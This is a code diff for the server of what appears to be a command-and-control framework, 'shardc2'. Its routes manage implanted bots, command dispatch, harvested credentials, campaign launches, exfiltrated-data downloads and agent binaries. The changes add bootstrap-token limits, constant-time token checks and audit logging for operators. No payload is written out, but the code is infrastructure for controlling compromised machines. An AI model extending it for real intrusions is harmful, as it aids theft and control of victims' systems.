@@ -5,12 +5,15 @@ import (
 	"crypto/ecdsa"
 	"crypto/elliptic"
 	"crypto/rand"
+	"crypto/subtle"
 	"crypto/x509"
 	"crypto/x509/pkix"
 	"encoding/pem"
 	"fmt"
 	"math/big"
+	"net/http"
 	"os"
+	"strings"
 	"time"
 
 	"github.com/gofiber/fiber/v2"
@@ -19,6 +22,7 @@ import (
 	"github.com/gofiber/fiber/v2/middleware/recover"
 	"github.com/gofiber/websocket/v2"
 	"github.com/shardc2/shardc2/internal/database"
+	"github.com/shardc2/shardc2/internal/server/audit"
 	"github.com/shardc2/shardc2/internal/server/engine"
 	"github.com/shardc2/shardc2/internal/server/handlers"
 	"github.com/shardc2/shardc2/internal/server/middleware"
@@ -27,12 +31,13 @@ import (
 )
 
 type ServerConfig struct {
-	OperatorToken string
-	ImplantKey    string
-	PayloadKey    []byte
-	C2URL         string
-	Profile       *profiles.Profile
-	JWTSecret     []byte
+	OperatorToken  string
+	BootstrapToken string
+	ImplantKey     string
+	PayloadKey     []byte
+	C2URL          string
+	Profile        *profiles.Profile
+	JWTSecret      []byte
 
 	LoginRateLimitMax    int
 	LoginRateLimitWindow time.Duration
@@ -88,18 +93,88 @@ func (s *Server) setupRoutes() {
 	campHandler := handlers.NewCampaignHandler(s.db, s.config.Policy)
 	exfilHandler := handlers.NewExfilHandler(s.db)
 	opHandler := handlers.NewOperatorHandler(s.db, s.config.JWTSecret)
+	auditRecorder := audit.NewRecorder(s.db)
 
 	// Operator routes — accept legacy bearer token OR JWT
 	opAuth := func(c *fiber.Ctx) error {
 		auth := c.Get("Authorization")
-		if len(auth) > 7 && auth[:7] == "Bearer " {
+		bootstrapToken := s.config.BootstrapToken
+		if bootstrapToken == "" {
+			bootstrapToken = s.config.OperatorToken
+		}
+		if strings.HasPrefix(auth, "Bearer ") && bootstrapToken != "" {
 			token := auth[7:]
-			if token == s.config.OperatorToken {
+			if subtle.ConstantTimeCompare([]byte(token), []byte(bootstrapToken)) == 1 {
+				if c.Method() != http.MethodPost || c.Path() != "/api/v1/operators" {
+					return c.Status(403).JSON(fiber.Map{"error": "bootstrap token may only create the initial admin"})
+				}
+				activeAdmin, err := s.hasActiveAdmin()
+				if err != nil {
+					return c.Status(500).JSON(fiber.Map{"error": "failed to check bootstrap state"})
+				}
+				if activeAdmin {
+					return c.Status(401).JSON(fiber.Map{"error": "bootstrap token disabled"})
+				}
+				c.Locals("operator_username", "bootstrap")
 				c.Locals("operator_role", "admin")
 				return c.Next()
 			}
 		}
 		return middleware.JWTAuth(s.config.JWTSecret)(c)
+	}
+	auditedOpAuth := func(c *fiber.Ctx) error {
+		if err := opAuth(c); err != nil {
+			_ = auditRecorder.Record(c, audit.Event{
+				Action:     "auth.denied",
+				ObjectType: "operator_route",
+				ObjectID:   c.Path(),
+				Outcome:    audit.OutcomeDenied,
+				Details: audit.SanitizeDetails(fiber.Map{
+					"method": c.Method(),
+					"path":   c.Path(),
+				}),
+			})
+			return err
+		}
+		if c.Response().StatusCode() >= 400 {
+			_ = auditRecorder.Record(c, audit.Event{
+				Action:     "auth.denied",
+				ObjectType: "operator_route",
+				ObjectID:   c.Path(),
+				Outcome:    audit.OutcomeDenied,
+				Details: audit.SanitizeDetails(fiber.Map{
+					"method": c.Method(),
+					"path":   c.Path(),
+				}),
+			})
+		}
+		return nil
+	}
+	auditAction := func(action string, objectType string) fiber.Handler {
+		return func(c *fiber.Ctx) error {
+			err := c.Next()
+			status := c.Response().StatusCode()
+			outcome := audit.OutcomeSuccess
+			if err != nil || status >= 400 {
+				outcome = audit.OutcomeFailure
+			}
+			objectID := c.Params("id")
+			if objectID == "" {
+				objectID = c.Params("bot_id")
+			}
+			_ = auditRecorder.Record(c, audit.Event{
+				Action:     action,
+				ObjectType: objectType,
+				ObjectID:   objectID,
+				Outcome:    outcome,
+				Details: audit.SanitizeDetails(fiber.Map{
+					"method": c.Method(),
+					"path":   c.Path(),
+					"status": status,
+				}),
+			})
+			return err
+		}
 	}
 
 	// Agent routes using malleable profile paths
@@ -113,7 +188,7 @@ func (s *Server) setupRoutes() {
 		p = profiles.Default()
 	}
 
-	api.Get("/agent/binary", opAuth, func(c *fiber.Ctx) error {
+	api.Get("/agent/binary", auditedOpAuth, auditAction("agent_binary.download", "agent_binary"), func(c *fiber.Ctx) error {
 		arch := c.Query("arch", "arm64")
 		if arch == "amd64" || arch == "x86_64" {
 			return c.SendFile("./bin/shardc2-agent-amd64", false)
@@ -150,7 +225,7 @@ func (s *Server) setupRoutes() {
 	}
 	api.Post("/auth/login", limiter.New(limiter.Config{Max: loginLimitMax, Expiration: loginLimitWindow}), opHandler.Login)
 
-	op := api.Group("", opAuth)
+	op := api.Group("", auditedOpAuth)
 	op.Use(limiter.New(limiter.Config{Max: 120, Expiration: time.Minute}))
 
 	bots := op.Group("/bots")
@@ -159,32 +234,32 @@ func (s *Server) setupRoutes() {
 	bots.Delete("/:id", botHandler.Remove)
 
 	cmds := op.Group("/commands")
-	cmds.Post("/", cmdHandler.Create)
-	cmds.Post("/batch", cmdHandler.BatchCreate)
+	cmds.Post("/", auditAction("command.create", "command"), cmdHandler.Create)
+	cmds.Post("/batch", auditAction("command.batch_create", "command"), cmdHandler.BatchCreate)
 	cmds.Get("/history/:bot_id", cmdHandler.History)
 
 	creds := op.Group("/credentials")
 	creds.Post("/", credHandler.Submit)
-	creds.Get("/", credHandler.List)
-	creds.Delete("/:id", credHandler.Delete)
+	creds.Get("/", auditAction("credential.list", "credential"), credHandler.List)
+	creds.Delete("/:id", auditAction("credential.delete", "credential"), credHandler.Delete)
 
 	camps := op.Group("/campaigns")
-	camps.Post("/", campHandler.Create)
+	camps.Post("/", auditAction("campaign.create", "campaign"), campHandler.Create)
 	camps.Get("/", campHandler.List)
 	camps.Get("/:id", campHandler.Get)
 	camps.Put("/:id", campHandler.Update)
-	camps.Delete("/:id", campHandler.Delete)
+	camps.Delete("/:id", auditAction("campaign.delete", "campaign"), campHandler.Delete)
 	camps.Post("/:id/bots", campHandler.AssignBots)
 	camps.Delete("/:id/bots/:bot_id", campHandler.RemoveBot)
 	camps.Get("/:id/bots", campHandler.ListBots)
-	camps.Post("/:id/launch", campHandler.Launch)
+	camps.Post("/:id/launch", auditAction("campaign.launch", "campaign"), campHandler.Launch)
 	camps.Get("/:id/progress", campHandler.Progress)
 	camps.Get("/:id/results", campHandler.Results)
 
 	exfil := op.Group("/exfil")
-	exfil.Get("/", exfilHandler.List)
-	exfil.Get("/:id", exfilHandler.Download)
-	exfil.Delete("/:id", exfilHandler.Delete)
+	exfil.Get("/", auditAction("exfil.list", "exfil"), exfilHandler.List)
+	exfil.Get("/:id", auditAction("exfil.download", "exfil"), exfilHandler.Download)
+	exfil.Delete("/:id", auditAction("exfil.delete", "exfil"), exfilHandler.Delete)
 
 	op.Get("/stats", botHandler.Stats)
 
@@ -196,9 +271,18 @@ func (s *Server) setupRoutes() {
 		}
 		return c.Next()
 	})
-	opAdmin.Post("/", opHandler.Register)
+	opAdmin.Post("/", auditAction("operator.create", "operator"), opHandler.Register)
 	opAdmin.Get("/", opHandler.List)
-	opAdmin.Delete("/:id", opHandler.Deactivate)
+	opAdmin.Delete("/:id", auditAction("operator.delete", "operator"), opHandler.Deactivate)
+}
+
+func (s *Server) hasActiveAdmin() (bool, error) {
+	if s.db == nil {
+		return false, nil
+	}
+	var exists bool
+	err := s.db.QueryRow(`SELECT EXISTS(SELECT 1 FROM operators WHERE role = 'admin' AND active = true)`).Scan(&exists)
+	return exists, err
 }
 
 func (s *Server) Start(addr string) error {
